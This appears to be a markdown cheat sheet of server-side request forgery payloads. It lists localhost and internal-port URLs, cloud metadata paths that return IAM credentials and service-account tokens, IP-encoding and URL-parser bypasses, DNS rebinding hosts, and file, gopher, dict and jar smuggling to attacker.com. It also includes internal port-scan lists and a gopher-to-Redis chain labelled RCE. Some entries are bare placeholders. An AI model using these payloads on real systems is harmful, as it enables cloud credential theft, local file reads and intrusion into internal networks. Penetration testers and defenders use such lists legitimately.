# SSRF Payloads Library

## Basic Localhost Access

### Standard localhost
```
http://localhost/
http://localhost:80
http://localhost:22
http://localhost:443
http://127.0.0.1/
http://127.0.0.1:80
http://127.0.0.1:22
http://127.0.0.1:443
```

### IPv6
```
http://[::1]/
http://[0000::1]/
http://[::ffff:127.0.0.1]
```

### 0.0.0.0
```
http://0.0.0.0/
http://0.0.0.0:80
http://0.0.0.0:22
```

## Cloud Metadata

### AWS EC2
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
```

### Google Cloud
```
http://metadata.google.internal/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```
http://169.254.169.254/metadata/instance
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

## Bypass Techniques

### IPv4 Variations
```
http://127.1
http://127.0.1
http://0
127.0.0.0 → 127.0.0.0
127.0.0.1 → 2130706433 (decimal)
127.0.0.1 → 0177.0.0.1 (octal)
127.0.0.1 → 0x7f000001 (hex)
```

### CIDR Range (127.0.0.0/8)
```
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

### URL Encoding
```
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin
```

### Enclosed Alphanumeric
```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
```

### Domain Redirection
```
http://localtest.me → ::1
http://localh.st → 127.0.0.1
http://spoofed.redacted.oastify.com → 127.0.0.1
http://company.127.0.0.1.nip.io
```

### DNS Rebinding
```
make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms
```

## URL Parser Bypass

###@ bypass
```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

### Different encoding
```
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin
```

## Protocol Smuggling

### file://
```
file:///etc/passwd
file:///\\/etc/passwd
```

### dict://
```
dict://attacker:11111/
dict://user;auth@localhost:11211/d:word:database:n
```

### sftp://
```
sftp://attacker.com:11111/
```

### tftp://
```
tftp://attacker.com:12346/TESTUDPPACKET
```

### ldap://
```
ldap://localhost:11211/%0astats%0aquit
```

### gopher://
```
gopher://localhost:25/_MAIL FROM:<attacker@example.com>
gopher://localhost:25/_MAIL FROM:<attacker@example.com>%0D%0A%0D%0A
```

### jar:// (Java blind)
```
jar:http://attacker.com/path!/ 
jar:ftp://attacker.com/file!
```

## Filter Bypass

### Against whitelist
```
http://localhost@attacker.com
http://attacker.com#@localhost
http://attacker.com%23@localhost
```

### Against blocklists
```
http://127.1/
http://0/
```

### PHP filter_var bypass
```
http://test???test.com
0://evil.com:80;http://google.com:80/
```

## Cloud Exploitation

### AWS
```
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/instance-type
http://169.254.169.254/latest/meta-data/security-credentials/
http://169.254.169.254/latest/meta-data/iam/info
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/instance/name
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### DigitalOcean
```
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/interfaces/0/ipv4/address
```

### Oracle Cloud
```
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/vnics/
```

## Port Scanning (Internal)

```
http://localhost:22
http://localhost:80
http://localhost:443
http://localhost:3306
http://localhost:5432
http://localhost:6379
http://localhost:8080
http://localhost:8443
```

## Blind SSRF -> RCE Chains

### Redis
```
gopher://localhost:6379/_*3%0d%0a$3%0d%0aset%0d%0a$11%0d%0aspamspampla%0d%0a$47%0d%0a%0a%0a*/1%20*%20%0a%0a*/1%20*%20%0a%0a*/1%20*%20%0a%0a%0a%0a
```

### Tomcat
```
gopher://localhost:8080/_EXP
```

### MySQL
```
gopher://localhost:3306/_PAYLOAD
```

## Port Scan via SSRF

### Quick scan common ports
```
http://localhost:21
http://localhost:22
http://localhost:23
http://localhost:25
http://localhost:53
http://localhost:80
http://localhost:110
http://localhost:143
http://localhost:443
http://localhost:445
http://localhost:993
http://localhost:995
http://localhost:3306
http://localhost:3389
http://localhost:5432
http://localhost:5900
http://localhost:6379
http://localhost:8080
http://localhost:8443
```

## Quick Reference

| Target | URL | Purpose |
|--------|-----|---------|
| AWS Meta | http://169.254.169.254/ | Cloud credentials |
| GCP Meta | http://metadata.google.internal/ | Cloud info |
| Localhost | http://127.0.0.1/ | Internal services |
| Internal | http://192.168.1.1/ | Internal network |
| File | file:///etc/passwd | Local file read |
| Gopher | gopher://host:port/ | Protocol relay |